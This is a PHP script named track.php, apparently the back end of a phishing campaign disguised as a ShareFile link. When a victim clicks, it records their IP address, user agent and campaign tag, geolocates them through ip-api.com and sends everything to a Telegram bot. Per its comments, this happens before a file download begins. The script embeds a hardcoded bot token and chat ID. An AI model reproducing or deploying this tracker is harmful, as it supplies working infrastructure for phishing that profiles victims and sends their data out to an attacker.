<?php
// ==================== TRACK.PHP ====================
// Receives the click event from index.html and sends the Telegram alert
// This script completes BEFORE the file download even starts

// Suppress all output to keep connection clean
ob_start();

$botToken = '8289153483:AAHe5_E3Z3kPYGbecRgk4wLcB73tDb3qhRw';
$chatID   = '8064402896';

$ip   = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$ua   = $_POST['ua'] ?? $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$action = $_POST['action'] ?? 'click';
$campaign = $_POST['campaign'] ?? 'sharefile';
$time = date('Y-m-d H:i:s');

// Geo lookup
$city = $country = $isp = 'Unknown';
if (filter_var($ip, FILTER_VALIDATE_IP)) {
    $geo = @json_decode(@file_get_contents("http://ip-api.com/json/{$ip}"));
    if ($geo) {
        $city    = $geo->city ?? 'Unknown';
        $country = $geo->country ?? 'Unknown';
        $isp     = $geo->isp ?? 'Unknown';
    }
}

$message = "🎯 *ShareFile Campaign - Click Tracked*\n\n"
         . "📍 *Action:* `{$action}`\n"
         . "📍 *Campaign:* `{$campaign}`\n"
         . "🌍 *IP:* `{$ip}`\n"
         . "🏙️ *City:* {$city}\n"
         . "🇺🇸 *Country:* {$country}\n"
         . "🏢 *ISP:* {$isp}\n"
         . "🕒 *Time:* {$time}\n"
         . "💻 *UA:* `{$ua}`";

$telegramUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";
$payload = json_encode([
    'chat_id'    => $chatID,
    'text'       => $message,
    'parse_mode' => 'Markdown'
]);

$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL            => $telegramUrl,
    CURLOPT_POST           => true,
    CURLOPT_POSTFIELDS     => $payload,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_CONNECTTIMEOUT => 5,
    CURLOPT_TIMEOUT        => 5,
    CURLOPT_HTTPHEADER     => ['Content-Type: application/json']
]);
curl_exec($ch);
curl_close($ch);

ob_end_clean();
http_response_code(200);
echo "OK";
exit;
?>